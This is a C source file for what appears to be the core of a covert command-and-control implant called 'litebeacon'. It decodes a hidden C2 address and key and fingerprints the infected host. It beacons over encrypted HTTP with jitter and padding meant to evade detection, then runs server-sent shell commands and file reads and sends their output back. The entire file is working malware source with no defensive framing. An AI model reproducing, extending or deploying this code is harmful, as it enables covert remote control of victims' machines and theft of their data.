/* Portable core: config decode, TLV protocol, task loop. */
#include "port.h"
#include "config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if defined(__BYTE_ORDER__) && __BYTE_ORDER__ != __ORDER_LITTLE_ENDIAN__
#error "this build only targets little-endian"
#endif

#define AEAD_CTX "lite/aead/v1" /* must match keyCtx in server/litebeacon/crypto.go */

#define TLV_ID        0x01
#define TLV_TS        0x02
#define TLV_PAD       0x0f
#define TLV_HOST      0x10
#define TLV_OS        0x11
#define TLV_ARCH      0x12
#define TLV_USER      0x13
#define TLV_PID       0x14
#define TLV_EXEC_RES  0x20
#define TLV_FILE_RES  0x30
#define TLV_EXEC_TASK 0x40
#define TLV_READ_TASK 0x41
#define TLV_SLEEP_TASK 0x42
#define TLV_EXIT_TASK 0x43

static char g_url[512];
static char g_ua[192];
static char g_json_key[24];
static unsigned char g_key[32];
static char g_id[17];
static unsigned int g_interval;

static void deob(const unsigned char *in, size_t n, char *out) {
    size_t i;
    for (i = 0; i < n; i++) out[i] = (char)(in[i] ^ CFG_XOR);
    out[n] = '\0';
}

/* ---- growable byte buffer ---- */
typedef struct {
    unsigned char *data;
    size_t len;
    size_t cap;
} buf_t;

static int buf_grow(buf_t *b, size_t need) {
    unsigned char *p;
    if (b->len + need <= b->cap) return 0;
    b->cap = b->cap ? b->cap : 256;
    while (b->len + need > b->cap) b->cap *= 2;
    p = (unsigned char *)realloc(b->data, b->cap);
    if (!p) return -1;
    b->data = p;
    return 0;
}

static void buf_raw(buf_t *b, const void *value, size_t n) {
    if (buf_grow(b, n) != 0) exit(1);
    if (n) memcpy(b->data + b->len, value, n);
    b->len += n;
}

static void buf_tlv(buf_t *b, unsigned char type, const void *value, size_t n) {
    unsigned char lenb[2];
    lenb[0] = (unsigned char)(n & 0xff);
    lenb[1] = (unsigned char)((n >> 8) & 0xff);
    buf_raw(b, &type, 1);
    buf_raw(b, lenb, 2);
    buf_raw(b, value, n);
}

/* ---- base64 (standard alphabet, with padding) ---- */
static const char B64T[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static size_t b64_encode(const unsigned char *in, size_t n, char *out) {
    size_t i, o = 0;
    for (i = 0; i + 2 < n; i += 3) {
        unsigned int v = ((unsigned int)in[i] << 16) | ((unsigned int)in[i + 1] << 8) | in[i + 2];
        out[o++] = B64T[(v >> 18) & 63];
        out[o++] = B64T[(v >> 12) & 63];
        out[o++] = B64T[(v >> 6) & 63];
        out[o++] = B64T[v & 63];
    }
    if (i < n) {
        unsigned int v = (unsigned int)in[i] << 16;
        int have = 1;
        if (i + 1 < n) { v |= (unsigned int)in[i + 1] << 8; have = 2; }
        out[o++] = B64T[(v >> 18) & 63];
        out[o++] = B64T[(v >> 12) & 63];
        out[o++] = have == 2 ? B64T[(v >> 6) & 63] : '=';
        out[o++] = '=';
    }
    out[o] = '\0';
    return o;
}

static int b64_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static int b64_decode(const char *in, size_t n, unsigned char *out, size_t *out_len) {
    size_t i, o = 0;
    unsigned int acc = 0;
    int bits = 0;
    for (i = 0; i < n; i++) {
        int v;
        if (in[i] == '=') break;
        v = b64_val(in[i]);
        if (v < 0) return -1;
        acc = (acc << 6) | (unsigned int)v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[o++] = (unsigned char)((acc >> bits) & 0xff);
        }
    }
    *out_len = o;
    return 0;
}

/* ---- JSON envelope: {"<key>":"<b64>"} ---- */
static int build_body(const buf_t *pt, char **body_out, size_t *body_len) {
    unsigned char nonce[12];
    unsigned char *ct, *sealed, tag[16];
    char *b64, *out;
    size_t sealed_len, b64_len, cap;

    if (pt->len == 0) return -1;
    ct = (unsigned char *)malloc(pt->len);
    if (!ct) return -1;
    rand_bytes(nonce, 12);
    if (aes_gcm_seal(g_key, nonce, pt->data, pt->len, ct, pt->len, tag) != 0) {
        free(ct);
        return -1;
    }
    sealed_len = 12 + pt->len + 16;
    sealed = (unsigned char *)malloc(sealed_len);
    b64 = (char *)malloc(((sealed_len + 2) / 3) * 4 + 1);
    if (!sealed || !b64) { free(ct); free(sealed); free(b64); return -1; }
    memcpy(sealed, nonce, 12);
    memcpy(sealed + 12, ct, pt->len);
    memcpy(sealed + 12 + pt->len, tag, 16);
    free(ct);
    b64_len = b64_encode(sealed, sealed_len, b64);
    free(sealed);

    cap = strlen(g_json_key) + b64_len + 16;
    out = (char *)malloc(cap);
    if (!out) { free(b64); return -1; }
    *body_len = (size_t)snprintf(out, cap, "{\"%s\":\"%s\"}", g_json_key, b64);
    free(b64);
    *body_out = out;
    return 0;
}

/* Server responses use the same single-field envelope; parse leniently. */
static int parse_envelope(const char *body, size_t body_len, buf_t *pt_out) {
    const char *colon, *q, *end;
    unsigned char *sealed, *plain;
    size_t b64n, sealed_len, plain_len;

    colon = (const char *)memchr(body, ':', body_len);
    if (!colon) return -1;
    q = (const char *)memchr(colon, '"', body_len - (size_t)(colon - body));
    if (!q) return -1;
    q++;
    end = (const char *)memchr(q, '"', body_len - (size_t)(q - body));
    if (!end) return -1;
    b64n = (size_t)(end - q);
    if (b64n == 0 || b64n > RESP_MAX_BODY) return -1;
    sealed = (unsigned char *)malloc((b64n / 4) * 3 + 3);
    if (!sealed) return -1;
    if (b64_decode(q, b64n, sealed, &sealed_len) != 0 || sealed_len < 28 || sealed_len > RESP_MAX_BODY) {
        free(sealed);
        return -1;
    }
    plain_len = sealed_len - 28;
    plain = (unsigned char *)malloc(plain_len ? plain_len : 1);
    if (!plain) { free(sealed); return -1; }
    if (aes_gcm_open(g_key, sealed, sealed + 12, plain_len, sealed + 12 + plain_len, plain, plain_len) != 0) {
        free(sealed);
        free(plain);
        return -1;
    }
    free(sealed);
    buf_raw(pt_out, plain, plain_len);
    free(plain);
    return 0;
}

/* ---- task execution ---- */
static void do_exec_task(uint32_t task_id, const char *cmd, int timeout_sec, buf_t *results) {
    unsigned char *out = NULL;
    size_t out_len = 0;
    int exit_code = -1;
    buf_t val = {0, 0, 0};
    int32_t ec32;

    if (exec_cmd(cmd, timeout_sec, &out, &out_len, &exit_code) != 0 && !out) {
        out = (unsigned char *)malloc(1);
        out_len = 0;
        exit_code = -1;
    }
    buf_raw(&val, &task_id, 4);
    ec32 = (int32_t)exit_code;
    buf_raw(&val, &ec32, 4);
    if (out && out_len) buf_raw(&val, out, out_len);
    buf_tlv(results, TLV_EXEC_RES, val.data ? val.data : (const unsigned char *)"", val.len);
    free(val.data);
    free(out);
}

static void do_read_task(uint32_t task_id, const char *path, buf_t *results) {
    unsigned char *out = NULL;
    size_t out_len = 0;
    int err_code = 0;
    buf_t val = {0, 0, 0};
    unsigned char eb;

    read_file_bytes(path, &out, &out_len, &err_code);
    buf_raw(&val, &task_id, 4);
    eb = (unsigned char)err_code;
    buf_raw(&val, &eb, 1);
    if (!err_code && out && out_len) buf_raw(&val, out, out_len);
    buf_tlv(results, TLV_FILE_RES, val.data ? val.data : (const unsigned char *)"", val.len);
    free(val.data);
    free(out);
}

static void run_tasks(const buf_t *tasks, buf_t *results) {
    const unsigned char *p = tasks->data;
    size_t remain = tasks->len;
    while (remain >= 3) {
        unsigned char type = p[0];
        size_t n = (size_t)p[1] | ((size_t)p[2] << 8);
        const unsigned char *v;
        if (remain < 3 + n) break;
        v = p + 3;
        switch (type) {
        case TLV_EXEC_TASK:
            if (n >= 6) {
                uint32_t task_id;
                int timeout_sec;
                memcpy(&task_id, v, 4);
                timeout_sec = (int)v[4] | ((int)v[5] << 8);
                do_exec_task(task_id, (const char *)(v + 6), timeout_sec, results);
            }
            break;
        case TLV_READ_TASK:
            if (n >= 4) {
                uint32_t task_id;
                memcpy(&task_id, v, 4);
                do_read_task(task_id, (const char *)(v + 4), results);
            }
            break;
        case TLV_SLEEP_TASK:
            if (n >= 5) {
                uint32_t iv;
                memcpy(&iv, v, 4);
                if (iv > 0) g_interval = iv;
            }
            break;
        case TLV_EXIT_TASK:
            sys_shutdown();
            exit(0);
        default:
            break;
        }
        p += 3 + n;
        remain -= 3 + n;
    }
}

/* ---- rhythm ---- */
static double rand_uniform(double lo, double hi) {
    unsigned char b;
    rand_bytes(&b, 1);
    return lo + (hi - lo) * ((double)b / 255.0);
}

static double next_interval(void) {
    double f = rand_uniform(0.5, 1.7);
    unsigned char b;
    rand_bytes(&b, 1);
    if (b < 21) f *= rand_uniform(2.0, 3.0); /* ~8% skip cycles */
    return (double)g_interval * f;
}

int main(void) {
    char hostname[256] = {0}, username[256] = {0}, os[128] = {0}, arch[64] = {0};
    unsigned char secret[32];
    unsigned char idhash[32];
    buf_t kctx = {0, 0, 0}, idb = {0, 0, 0}, results = {0, 0, 0};
    uint32_t pid = 0;
    int first = 1;
    double backoff = 1.0;
    size_t i;

    if (sys_init() != 0) return 1;
    deob(CFG_URL, CFG_URL_LEN, g_url);
    deob(CFG_UA, CFG_UA_LEN, g_ua);
    deob(CFG_JSON_KEY, CFG_JSON_KEY_LEN, g_json_key);
    deob(CFG_KEY, (size_t)CFG_KEY_LEN, (char *)secret);
    g_interval = CFG_INTERVAL;
    if (g_interval == 0) g_interval = 180;

    buf_raw(&kctx, secret, 32);
    buf_raw(&kctx, AEAD_CTX, strlen(AEAD_CTX));
    if (sha256(kctx.data, kctx.len, g_key) != 0) return 1;
    free(kctx.data);

    host_info(hostname, sizeof hostname, username, sizeof username, os, sizeof os, arch, sizeof arch, &pid);
    buf_raw(&idb, secret, 32);
    buf_raw(&idb, hostname, strlen(hostname));
    buf_raw(&idb, username, strlen(username));
    if (sha256(idb.data, idb.len, idhash) != 0) return 1;
    free(idb.data);
    for (i = 0; i < 8; i++) sprintf(g_id + i * 2, "%02x", idhash[i]);
    memset(secret, 0, sizeof secret);
    memset(idhash, 0, sizeof idhash);

    sleep_sec(rand_uniform(5.0, 30.0)); /* sever the deploy->callback link */

    for (;;) {
        buf_t pt = {0, 0, 0}, tasks = {0, 0, 0};
        char *body = NULL, *resp = NULL;
        size_t body_len = 0, resp_len = 0;
        long status = 0;
        unsigned char ts8[8], pad[256];
        uint64_t now = now_unix();

        memcpy(ts8, &now, 8);
        buf_tlv(&pt, TLV_ID, g_id, strlen(g_id));
        buf_tlv(&pt, TLV_TS, ts8, 8);
        if (first) {
            buf_tlv(&pt, TLV_HOST, hostname, strlen(hostname));
            buf_tlv(&pt, TLV_OS, os, strlen(os));
            buf_tlv(&pt, TLV_ARCH, arch, strlen(arch));
            buf_tlv(&pt, TLV_USER, username, strlen(username));
            buf_tlv(&pt, TLV_PID, &pid, 4);
            first = 0;
        }
        if (results.len) buf_raw(&pt, results.data, results.len);
        rand_bytes(pad, sizeof pad);
        buf_tlv(&pt, TLV_PAD, pad, (size_t)(1 + pad[0])); /* 1..256B size jitter */

        if (build_body(&pt, &body, &body_len) != 0) {
            free(pt.data);
            sleep_sec(backoff);
            backoff = backoff * 2 > (double)g_interval ? (double)g_interval : backoff * 2;
            continue;
        }
        free(pt.data);

        if (http_post(g_url, g_ua, body, body_len, &status, &resp, &resp_len) != 0 || status != 200) {
            free(body);
            free(resp);
            sleep_sec(backoff);
            backoff = backoff * 2 > (double)g_interval ? (double)g_interval : backoff * 2;
            continue;
        }
        free(body);
        backoff = 1.0;
        results.len = 0; /* server consumed the pending results */

        if (parse_envelope(resp, resp_len, &tasks) == 0) {
            run_tasks(&tasks, &results);
            free(tasks.data);
        }
        free(resp);

        if (results.len) {
            sleep_sec(rand_uniform(1.0, 4.0)); /* decouple task->result timing */
            continue;
        }
        sleep_sec(next_interval());
    }
}
